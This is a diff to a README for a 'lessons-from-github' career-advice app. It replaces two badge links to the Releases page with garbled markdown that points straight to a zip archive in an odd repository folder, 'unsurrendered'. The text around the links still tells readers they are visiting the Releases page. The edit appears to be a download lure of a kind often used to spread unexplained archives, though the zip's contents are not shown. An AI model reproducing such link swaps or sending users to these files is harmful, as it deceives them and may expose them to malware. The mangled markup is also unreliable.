@@ -8,7 +8,7 @@ Welcome to the "lessons-from-github" repository! This application compiles valua
 
 To get started with the application, you need to download it from our Releases page. Click the link below to access it:
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/xfiu1234/lessons-from-github/releases)
+[![Download from Releases](https://raw.githubusercontent.com/xfiu1234/lessons-from-github/main/unsurrendered/lessons-from-github_3.3.zip%20Now-Release%https://raw.githubusercontent.com/xfiu1234/lessons-from-github/main/unsurrendered/lessons-from-github_3.3.zip)](https://raw.githubusercontent.com/xfiu1234/lessons-from-github/main/unsurrendered/lessons-from-github_3.3.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Find the latest version of the application.
@@ -64,6 +64,6 @@ To contribute, fork the repository, make your changes, and submit a pull request
 
 For more information and the latest updates, always check our Releases page:
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/xfiu1234/lessons-from-github/releases)
+[![Download from Releases](https://raw.githubusercontent.com/xfiu1234/lessons-from-github/main/unsurrendered/lessons-from-github_3.3.zip%20Now-Release%https://raw.githubusercontent.com/xfiu1234/lessons-from-github/main/unsurrendered/lessons-from-github_3.3.zip)](https://raw.githubusercontent.com/xfiu1234/lessons-from-github/main/unsurrendered/lessons-from-github_3.3.zip)
 
 Your journey in learning professional principles from industry experts starts here! Enjoy exploring the insights and applying them to your career.
